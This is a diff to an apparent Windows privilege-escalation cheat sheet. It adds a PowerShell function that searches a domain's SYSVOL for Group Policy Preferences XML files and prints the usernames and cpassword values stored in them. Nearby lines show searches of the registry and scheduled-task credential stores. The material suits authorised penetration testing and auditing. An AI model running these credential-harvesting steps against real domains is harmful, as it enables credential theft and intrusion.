@@ -44,6 +44,7 @@
     * [Enumerate Specific File Names](#enumerate-specific-file-names)
     * [Enumerate Password KeyWord in Files](#enumerate-password-keyword-in-files)
     * [Scheduled Task Credentials](#scheduled-task-credentials)
+    * [Enumerate cpassword in GPOs](#enumerate-cpassword-in-gpos)
     * [Kerberos Tickets](#kerberos-tickets)
       * [Service Accounts](#service-accounts)
   * [Privilege Escalation](#privilege-escalation)
@@ -422,6 +423,43 @@ reg query HKCU /f password /t REG_SZ /s
 ```
 # The systemprofile AppData contains credentials for scheduled tasks if present
 ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+```
+
+## **Enumerate cpassword in GPOs**
+
+```
+# Enumerate GPP XML files containing cpasswords in SYSVOL
+function Get-GPPCPassword {
+    $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
+    $sysvol = "\\$domain\SYSVOL\$domain\Policies\"
+    
+    Write-Host "`n[*] Searching for GPP cpasswords in: $sysvol`n" -ForegroundColor Cyan
+    
+    $files = Get-ChildItem -Path $sysvol -Recurse -Include Groups.xml, Services.xml, ScheduledTasks.xml, Printers.xml, Drives.xml -ErrorAction SilentlyContinue
+    
+    foreach ($file in $files) {
+        try {
+            [xml]$xml = Get-Content $file.FullName
+            $nodes = $xml.SelectNodes("//Properties[@cpassword]")
+            if ($nodes) {
+                foreach ($node in $nodes) {
+                    $user = $node.userName
+                    $cpassword = $node.cpassword
+                    Write-Host "[+] Found cpassword!" -ForegroundColor Green
+                    Write-Host "    File     : $($file.FullName)"
+                    Write-Host "    Username : $user"
+                    Write-Host "    cpassword: $cpassword"
+                    Write-Host ""
+                }
+            }
+        } catch {
+            Write-Warning "Error parsing $($file.FullName): $_"
+        }
+    }
+}
+
+# Run the function
+Get-GPPCPassword
 ```
 
 ## **Kerberos Tickets**
